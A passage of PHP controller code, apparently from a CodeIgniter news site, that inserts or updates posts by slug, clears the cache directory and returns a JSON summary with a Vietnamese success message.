        foreach ($allPosts as $postData) {
            $existing = $db->table('posts')->where('slug', $postData['slug'])->get()->getRow();
            if (!empty($existing)) {
                $db->table('posts')->where('id', $existing->id)->update($postData);
                $updatedCount++;
            } else {
                $db->table('posts')->insert($postData);
                $insertedCount++;
            }
        }

        // Cache refresh safely
        try {
            cache()->clean();
            $files = glob(WRITEPATH . 'cache/*');
            if (!empty($files)) {
                foreach ($files as $file) {
                    if (is_file($file) && basename($file) !== 'index.html') {
                        @unlink($file);
                    }
                }
            }
            if (function_exists('resetCacheData')) {
                resetCacheData();
            }
        } catch (\Throwable $e) {}

        $languages = $db->table('languages')->get()->getResult();
        $postStats = $db->table('posts')->select('lang_id, count(*) as total')->groupBy('lang_id')->get()->getResult();

        return $this->response->setJSON([
            'status' => 'success',
            'message' => "Đã tạo thành công bài viết cho tất cả các chủ đề cốt lõi ({$insertedCount} bài mới, {$updatedCount} bài cập nhật)",
            'total_topics' => 5,
            'posts_per_topic' => 2,
            'languages' => $languages,
            'postStats' => $postStats,
            'activeLang_id' => $this->activeLang->id,
            'news_url' => langBaseUrl('posts')
        ]);
    }
}


